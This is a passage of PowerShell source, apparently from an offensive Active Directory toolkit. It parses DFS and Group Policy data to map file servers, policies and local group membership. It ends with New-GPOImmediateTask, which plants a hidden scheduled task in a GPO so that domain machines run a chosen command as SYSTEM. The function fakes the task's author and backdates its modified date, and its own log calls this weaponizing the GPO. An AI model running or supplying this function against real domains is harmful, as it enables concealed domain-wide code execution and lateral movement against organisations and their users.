                    $prefix_size_start = $root_or_link_guid_end + 1
                    $prefix_size_end = $prefix_size_start + 1
                    $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                    $prefix_start = $prefix_size_end + 1
                    $prefix_end = $prefix_start + $prefix_size - 1
                    $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])
                    #write-host "Prefix: " $prefix
                    $short_prefix_size_start = $prefix_end + 1
                    $short_prefix_size_end = $short_prefix_size_start + 1
                    $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                    $short_prefix_start = $short_prefix_size_end + 1
                    $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                    $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])
                    #write-host "Short Prefix: " $short_prefix
                    $type_start = $short_prefix_end + 1
                    $type_end = $type_start + 3
                    $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)
                    #write-host $type
                    $state_start = $type_end + 1
                    $state_end = $state_start + 3
                    $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)
                    #write-host $state
                    $comment_size_start = $state_end + 1
                    $comment_size_end = $comment_size_start + 1
                    $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                    $comment_start = $comment_size_end + 1
                    $comment_end = $comment_start + $comment_size - 1
                    if ($comment_size -gt 0)  {
                        $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        #Write-Host $comment 
                    }
                    $prefix_timestamp_start = $comment_end + 1
                    $prefix_timestamp_end = $prefix_timestamp_start + 7
                    # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME
                    $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] #dword lowDateTime #dword highdatetime
                    $state_timestamp_start = $prefix_timestamp_end + 1
                    $state_timestamp_end = $state_timestamp_start + 7
                    $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                    $comment_timestamp_start = $state_timestamp_end + 1
                    $comment_timestamp_end = $comment_timestamp_start + 7
                    $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                    $version_start = $comment_timestamp_end  + 1
                    $version_end = $version_start + 3
                    $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                    #write-host $version
                    if ($version -ne 3)
                    {
                        #write-host "error"
                    }

                    # Parse rest of DFSNamespaceRootOrLinkBlob here
                    $dfs_targetlist_blob_size_start = $version_end + 1
                    $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                    $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)
                    #write-host $dfs_targetlist_blob_size
                    $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                    $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                    $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                    $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                    $reserved_blob_size_end = $reserved_blob_size_start + 3
                    $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)
                    #write-host $reserved_blob_size
                    $reserved_blob_start = $reserved_blob_size_end + 1
                    $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                    $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                    $referral_ttl_start = $reserved_blob_end + 1
                    $referral_ttl_end = $referral_ttl_start + 3
                    $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                    #Parse DFSTargetListBlob
                    $target_count_start = 0
                    $target_count_end = $target_count_start + 3
                    $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                    $t_offset = $target_count_end + 1
                    #write-host $target_count

                    for($j=1; $j -le $target_count; $j++){
                        $target_entry_size_start = $t_offset
                        $target_entry_size_end = $target_entry_size_start + 3
                        $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                        #write-host $target_entry_size
                        $target_time_stamp_start = $target_entry_size_end + 1
                        $target_time_stamp_end = $target_time_stamp_start + 7
                        # FILETIME again or special if priority rank and priority class 0
                        $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                        $target_state_start = $target_time_stamp_end + 1
                        $target_state_end = $target_state_start + 3
                        $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)
                        #write-host $target_state
                        $target_type_start = $target_state_end + 1
                        $target_type_end = $target_type_start + 3
                        $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)
                        #write-host $target_type
                        $server_name_size_start = $target_type_end + 1
                        $server_name_size_end = $server_name_size_start + 1
                        $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)
                        #write-host $server_name_size 
                        $server_name_start = $server_name_size_end + 1
                        $server_name_end = $server_name_start + $server_name_size - 1
                        $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])
                        #write-host $server_name
                        $share_name_size_start = $server_name_end + 1
                        $share_name_size_end = $share_name_size_start + 1
                        $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                        $share_name_start = $share_name_size_end + 1
                        $share_name_end = $share_name_start + $share_name_size - 1
                        $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])
                        #write-host $share_name
                        $target_list += "\\$server_name\$share_name"
                        $t_offset = $share_name_end + 1
                    }
                }
            }
            $offset = $blob_data_end + 1
            $dfs_pkt_properties = @{
                'Name' = $blob_name
                'Prefix' = $prefix
                'TargetList' = $target_list
            }
            $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
            $prefix = $null
            $blob_name = $null
            $target_list = $null
        }

        $servers = @()
        $object_list | ForEach-Object {
            #write-host $_.Name;
            #write-host $_.TargetList
            if ($_.TargetList) {
                $_.TargetList | ForEach-Object {
                    $servers += $_.split("\")[2]
                }
            }
        }

        $servers
    }

    function Get-DFSshareV1 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)]
            [Int]
            $PageSize = 200,

            [Management.Automation.PSCredential]
            $Credential
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=fTDfs))"

            try {
                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $RemoteNames = $Properties.remoteservername
                    $Pkt = $Properties.pkt

                    $DFSshares += $RemoteNames | ForEach-Object {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug "Error in parsing DFS share : $_"
                        }
                    }
                }

                if($pkt -and $pkt[0]) {
                    Parse-Pkt $pkt[0] | ForEach-Object {
                        # If a folder doesn't have a redirection it will
                        # have a target like
                        # \\null\TestNameSpace\folder\.DFSFolderLink so we
                        # do actually want to match on "null" rather than
                        # $null
                        if ($_ -ne "null") {
                            New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                        }
                    }
                }
            }
            catch {
                Write-Warning "Get-DFSshareV1 error : $_"
            }
            $DFSshares | Sort-Object -Property "RemoteServerName"
        }
    }

    function Get-DFSshareV2 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200,

            [Management.Automation.PSCredential]
            $Credential
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=msDFS-Linkv2))"
            $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

            try {
                $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $target_list = $Properties.'msdfs-targetlistv2'[0]
                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                    $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                        try {
                            $Target = $_.InnerText
                            if ( $Target.Contains('\') ) {
                                $DFSroot = $Target.split("\")[3]
                                $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug "Error in parsing target : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Get-DFSshareV2 error : $_"
            }
            $DFSshares | Sort-Object -Unique -Property "RemoteServerName"
        }
    }

    $DFSshares = @()

    if ( ($Version -eq "all") -or ($Version.endsWith("1")) ) {
        $DFSshares += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }
    if ( ($Version -eq "all") -or ($Version.endsWith("2")) ) {
        $DFSshares += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }

    $DFSshares | Sort-Object -Property ("RemoteServerName","Name") -Unique
}


########################################################
#
# GPO related functions.
#
########################################################

function Get-GptTmpl {
<#
    .SYNOPSIS
        Helper to parse a GptTmpl.inf policy file path into a custom object.
    .PARAMETER GptTmplPath
        The GptTmpl.inf file path name to parse. 
    .PARAMETER UsePSDrive
        Switch. Mount the target GptTmpl folder path as a temporary PSDrive.
    .EXAMPLE
        PS C:\> Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
        Parse the default domain policy .inf for dev.testlab.local
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GptTmplPath,

        [Switch]
        $UsePSDrive
    )

    begin {
        if($UsePSDrive) {
            # if we're PSDrives, create a temporary mount point
            $Parts = $GptTmplPath.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]
            $RandDrive = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path $GptTmplPath using a temp PSDrive at $RandDrive"

            try {
                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path $GptTmplPath : $_"
                return $Null
            }

            # so we can cd/dir the new drive
            $GptTmplPath = $RandDrive + ":\" + $FilePath
        } 
    }

    process {
        $SectionName = ''
        $SectionsTemp = @{}
        $SectionsFinal = @{}

        try {
            Write-Verbose "Parsing $GptTmplPath"

            Get-Content $GptTmplPath -ErrorAction Stop | ForEach-Object {
                if ($_ -match '\[') {
                    # this signifies that we're starting a new section
                    $SectionName = $_.trim('[]') -replace ' ',''
                }
                elseif($_ -match '=') {
                    $Parts = $_.split('=')
                    $PropertyName = $Parts[0].trim()
                    $PropertyValues = $Parts[1].trim()

                    if($PropertyValues -match ',') {
                        $PropertyValues = $PropertyValues.split(',')
                    }

                    if(!$SectionsTemp[$SectionName]) {
                        $SectionsTemp.Add($SectionName, @{})
                    }

                    # add the parsed property into the relevant Section name
                    $SectionsTemp[$SectionName].Add( $PropertyName, $PropertyValues )
                }
            }

            ForEach ($Section in $SectionsTemp.keys) {
                # transform each nested hash table into a custom object
                $SectionsFinal[$Section] = New-Object PSObject -Property $SectionsTemp[$Section]
            }

            # transform the parent hash table into a custom object
            New-Object PSObject -Property $SectionsFinal
        }
        catch {
            Write-Debug "Error parsing $GptTmplPath : $_"
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose "Removing temp PSDrive $RandDrive"
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive -Force
        }
    }
}


function Get-GroupsXML {
<#
    .SYNOPSIS
        Helper to parse a groups.xml file path into a custom object.
    .PARAMETER GroupsXMLpath
        The groups.xml file path name to parse. 
    .PARAMETER ResolveSids
        Switch. Resolve Sids from a DC policy to object names.
    .PARAMETER UsePSDrive
        Switch. Mount the target groups.xml folder path as a temporary PSDrive.
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GroupsXMLPath,

        [Switch]
        $ResolveSids,

        [Switch]
        $UsePSDrive
    )

    begin {
        if($UsePSDrive) {
            # if we're PSDrives, create a temporary mount point
            $Parts = $GroupsXMLPath.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]
            $RandDrive = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path $GroupsXMLPath using a temp PSDrive at $RandDrive"

            try {
                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
            }
            catch {
                Write-Debug "Error mounting path $GroupsXMLPath : $_"
                return $Null
            }

            # so we can cd/dir the new drive
            $GroupsXMLPath = $RandDrive + ":\" + $FilePath
        } 
    }

    process {

        try {
            [xml] $GroupsXMLcontent = Get-Content $GroupsXMLPath -ErrorAction Stop

            # process all group properties in the XML
            $GroupsXMLcontent | Select-Xml "//Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $Members = @()
                $MemberOf = @()

                # extract the localgroup sid for memberof
                $LocalSid = $_.Properties.GroupSid
                if(!$LocalSid) {
                    if($_.Properties.groupName -match 'Administrators') {
                        $LocalSid = 'S-1-5-32-544'
                    }
                    elseif($_.Properties.groupName -match 'Remote Desktop') {
                        $LocalSid = 'S-1-5-32-555'
                    }
                    else {
                        $LocalSid = $_.Properties.groupName
                    }
                }
                $MemberOf = @($LocalSid)

                $_.Properties.members | ForEach-Object {
                    # process each member of the above local group
                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {

                        if($_.sid) {
                            $Members += $_.sid
                        }
                        else {
                            # just a straight local account name
                            $Members += $_.name
                        }
                    }
                }

                if ($Members -or $Memberof) {
                    # extract out any/all filters...I hate you GPP
                    $Filters = $_.filters | ForEach-Object {
                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }

                    if($ResolveSids) {
                        $Memberof = $Memberof | ForEach-Object {Convert-SidToName $_}
                        $Members = $Members | ForEach-Object {Convert-SidToName $_}
                    }

                    if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}
                    if($Members -isnot [system.array]) {$Members = @($Members)}

                    $GPOProperties = @{
                        'GPODisplayName' = $GPODisplayName
                        'GPOName' = $GPOName
                        'GPOPath' = $GroupsXMLPath
                        'Filters' = $Filters
                        'MemberOf' = $Memberof
                        'Members' = $Members
                    }

                    New-Object -TypeName PSObject -Property $GPOProperties
                }
            }
        }
        catch {
            Write-Debug "Error parsing $GptTmplPath : $_"
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose "Removing temp PSDrive $RandDrive"
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive -Force
        }
    }
}


function Get-NetGPO {
<#
    .SYNOPSIS
        Gets a list of all current GPOs in a domain.
    .PARAMETER GPOname
        The GPO name to query for, wildcards accepted.   
    .PARAMETER DisplayName
        The GPO display name to query for, wildcards accepted.   
    .PARAMETER Domain
        The domain to query for GPOs, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through
        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"
    .PARAMETER PageSize
        The PageSize to set for the LDAP searcher object.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.
    .EXAMPLE
        PS C:\> Get-NetGPO -Domain testlab.local
        
        Returns the GPOs in the 'testlab.local' domain. 
#>
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $ComputerName,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if ($GPOSearcher) {

            if($ComputerName) {
                $GPONames = @()
                $Computers = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize

                if(!$Computers) {
                    throw "Computer $ComputerName in domain '$Domain' not found! Try a fully qualified host name"
                }
                
                # get the given computer's OU
                $ComputerOUs = @()
                ForEach($Computer in $Computers) {
                    # extract all OUs a computer is a part of
                    $DN = $Computer.distinguishedname

                    $ComputerOUs += $DN.split(",") | ForEach-Object {
                        if($_.startswith("OU=")) {
                            $DN.substring($DN.indexof($_))
                        }
                    }
                }
                
                Write-Verbose "ComputerOUs: $ComputerOUs"

                # find all the GPOs linked to the computer's OU
                ForEach($ComputerOU in $ComputerOUs) {
                    $GPONames += Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $ComputerOU -FullData -PageSize $PageSize | ForEach-Object { 
                        # get any GPO links
                        write-verbose "blah: $($_.name)"
                        $_.gplink.split("][") | ForEach-Object {
                            if ($_.startswith("LDAP")) {
                                $_.split(";")[0]
                            }
                        }
                    }
                }
                
                Write-Verbose "GPONames: $GPONames"

                # find any GPOs linked to the site for the given computer
                $ComputerSite = (Get-SiteName -ComputerName $ComputerName).SiteName
                if($ComputerSite -and ($ComputerSite -ne 'ERROR')) {
                    $GPONames += Get-NetSite -SiteName $ComputerSite -FullData | ForEach-Object {
                        if($_.gplink) {
                            $_.gplink.split("][") | ForEach-Object {
                                if ($_.startswith("LDAP")) {
                                    $_.split(";")[0]
                                }
                            }
                        }
                    }
                }

                $GPONames | Where-Object{$_ -and ($_ -ne '')} | ForEach-Object {

                    # use the gplink as an ADS path to enumerate all GPOs for the computer
                    $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $_ -PageSize $PageSize
                    $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"

                    try {
                        $GPOSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                            $Out = Convert-LDAPProperty -Properties $_.Properties
                            $Out | Add-Member Noteproperty 'ComputerName' $ComputerName
                            $Out
                        }
                    }
                    catch {
                        Write-Warning $_
                    }
                }
            }

            else {
                if($DisplayName) {
                    $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))"
                }
                else {
                    $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"
                }

                try {
                    $GPOSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                        # convert/process the LDAP fields for each result
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                }
                catch {
                    Write-Warning $_
                }
            }
        }
    }
}

function New-GPOImmediateTask {
<#
    .SYNOPSIS
        Builds an 'Immediate' schtask to push out through a specified GPO.
    .PARAMETER TaskName
        Name for the schtask to recreate. Required.
    .PARAMETER Command
        The command to execute with the task, defaults to 'powershell'
    .PARAMETER CommandArguments
        The arguments to supply to the -Command being launched.
    .PARAMETER TaskDescription
        An optional description for the task.
    .PARAMETER TaskAuthor
        
        The displayed author of the task, defaults to ''NT AUTHORITY\System'
    .PARAMETER TaskModifiedDate
    
        The displayed modified date for the task, defaults to 30 days ago.
    .PARAMETER GPOname
        The GPO name to build the task for.
    .PARAMETER GPODisplayName
        The GPO display name to build the task for.
    .PARAMETER Domain
        The domain to query for the GPOs, defaults to the current domain.
    .PARAMETER DomainController
        Domain controller to reflect LDAP queries through.
    .PARAMETER ADSpath
        The LDAP source to search through
        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object of alternate credentials
        for connection to the target.
    .EXAMPLE
        PS> New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments '-c "123 | Out-File C:\Temp\debug.txt"' -Force
        Create an immediate schtask that executes the specified PowerShell arguments and
        push it out to the 'SecurePolicy' GPO, skipping the confirmation prompt.
    .EXAMPLE
        PS> New-GPOImmediateTask -GPODisplayName SecurePolicy -Remove -Force
        Remove all schtasks from the 'SecurePolicy' GPO, skipping the confirmation prompt.
#>
    [CmdletBinding(DefaultParameterSetName = 'Create')]
    Param (
        [Parameter(ParameterSetName = 'Create', Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskName,

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command = 'powershell',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $CommandArguments,

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskDescription = '',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskAuthor = 'NT AUTHORITY\System',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskModifiedDate = (Get-Date (Get-Date).AddDays(-30) -Format u).trim("Z"),

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $GPOname,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $GPODisplayName,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $DomainController,
        
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $ADSpath,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [Switch]
        $Force,

        [Parameter(ParameterSetName = 'Remove')]
        [Switch]
        $Remove,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]        
        [Management.Automation.PSCredential]
        $Credential
    )

    # build the XML spec for our 'immediate' scheduled task
    $TaskXML = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="'+$TaskName+'" image="0" changed="'+$TaskModifiedDate+'" uid="{'+$([guid]::NewGuid())+'}" userContext="0" removePolicy="0"><Properties action="C" name="'+$TaskName+'" runAs="NT AUTHORITY\System" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>'+$TaskAuthor+'</Author><Description>'+$TaskDescription+'</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>InteractiveToken</LogonType></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings><Actions Context="Author"><Exec><Command>'+$Command+'</Command><Arguments>'+$CommandArguments+'</Arguments></Exec></Actions><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers></Task></Properties></ImmediateTaskV2></ScheduledTasks>'

    if (!$PSBoundParameters['GPOname'] -and !$PSBoundParameters['GPODisplayName']) {
        Write-Warning 'Either -GPOName or -GPODisplayName must be specified'
        return
    }

    # eunmerate the specified GPO(s)
    $GPOs = Get-NetGPO -GPOname $GPOname -DisplayName $GPODisplayName -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -Credential $Credential 
    
    if(!$GPOs) {
        Write-Warning 'No GPO found.'
        return
    }

    $GPOs | ForEach-Object {
        $ProcessedGPOName = $_.Name
        try {
            Write-Verbose "Trying to weaponize GPO: $ProcessedGPOName"

            # map a network drive as New-PSDrive/New-Item/etc. don't accept -Credential properly :(
            if($Credential) {
                Write-Verbose "Mapping '$($_.gpcfilesyspath)' to network drive N:\"
                $Path = $_.gpcfilesyspath.TrimEnd('\')
                $Net = New-Object -ComObject WScript.Network
                $Net.MapNetworkDrive("N:", $Path, $False, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                $TaskPath = "N:\Machine\Preferences\ScheduledTasks\"
            }
            else {
                $TaskPath = $_.gpcfilesyspath + "\Machine\Preferences\ScheduledTasks\"
            }

            if($Remove) {
                if(!(Test-Path "$TaskPath\ScheduledTasks.xml")) {
                    Throw "Scheduled task doesn't exist at $TaskPath\ScheduledTasks.xml"
                }

                if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Removing schtask at $TaskPath\ScheduledTasks.xml")) {
                    return
                }

                Remove-Item -Path "$TaskPath\ScheduledTasks.xml" -Force
            }
            else {
                if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Creating schtask at $TaskPath\ScheduledTasks.xml")) {
                    return
                }
                
                # create the folder if it doesn't exist
                $Null = New-Item -ItemType Directory -Force -Path $TaskPath

                if(Test-Path "$TaskPath\ScheduledTasks.xml") {
                    Throw "Scheduled task already exists at $TaskPath\ScheduledTasks.xml !"
                }

                $TaskXML | Set-Content -Encoding ASCII -Path "$TaskPath\ScheduledTasks.xml"
            }

            if($Credential) {
                Write-Verbose "Removing mounted drive at N:\"
                $Net = New-Object -ComObject WScript.Network
                $Net.RemoveNetworkDrive("N:")
            }
        }
        catch {
            Write-Warning "Error for GPO $ProcessedGPOName : $_"
            if($Credential) {
                Write-Verbose "Removing mounted drive at N:\"
                $Net = New-Object -ComObject WScript.Network
                $Net.RemoveNetworkDrive("N:")
            }
        }
    }
}
#New-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO1 -CommandArguments '-c "123 | Out-File C:\test\debug.txt"' -Force
